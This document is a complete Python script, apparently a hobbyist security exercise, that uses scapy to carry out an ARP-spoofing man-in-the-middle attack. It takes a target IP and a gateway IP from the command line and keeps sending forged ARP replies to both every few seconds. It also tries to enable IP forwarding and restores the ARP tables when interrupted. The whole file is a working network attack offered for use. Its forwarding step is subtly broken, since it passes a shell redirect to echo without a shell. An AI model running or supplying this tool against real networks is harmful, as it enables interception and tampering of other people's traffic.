import scapy.all as scapy
import time
import optparse
import subprocess

def ip_forwarding():
    subprocess.call(["echo","1",">","/proc/sys/net/ipv4/ip_forward"])
    print("IP Forwarding...")

def get_user_inputs():
    parser = optparse.OptionParser()
    parser.add_option("-t","--target",dest="target_ip",help="Enter target IP Address")
    parser.add_option("-g","--gateway",dest="gateway_ip",help="Enter gateway IP Address")
    user_inputs = parser.parse_args()[0]
    if not user_inputs.target_ip or not user_inputs.gateway_ip:
        print("Please enter target and gateway IP addresses")
    return user_inputs

def get_mac_address(ip):
    arp_req = scapy.ARP(pdst=ip)
    broadcast_req = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    main_packet = broadcast_req / arp_req
    answers = scapy.srp(main_packet, timeout=1,verbose = False)[0]
    return answers[0][1].hwsrc

def arp_poisoning(target_ip,gateway_ip):
    target_mac = get_mac_address(target_ip)
    arp_response = scapy.ARP(pdst=target_ip,hwdst=target_mac,psrc=gateway_ip,op=2)
    scapy.send(arp_response,verbose=False)

def resetting_arp(fooled_ip, gateway_ip):
    fooled_mac = get_mac_address(fooled_ip)
    gateway_mac = get_mac_address(gateway_ip)
    arp_response = scapy.ARP(pdst=fooled_ip, hwdst=fooled_mac, psrc=gateway_ip, hwsrc=gateway_mac ,op=2)
    scapy.send(arp_response, verbose=False,count=5)

user_target_ip = get_user_inputs().target_ip
user_gateway_ip = get_user_inputs().gateway_ip

counter = 0
try:
    ip_forwarding()
    while True:
        arp_poisoning(user_target_ip,user_gateway_ip)
        arp_poisoning(user_gateway_ip,user_target_ip)
        counter += 2
        print("\rSending ARP packages..." + str(counter), end="")
        time.sleep(3)
except KeyboardInterrupt:
    resetting_arp(user_target_ip,user_gateway_ip)
    resetting_arp(user_gateway_ip,user_target_ip)
    print("\nAll changes fixed. You are safe...")
    print("Bye...")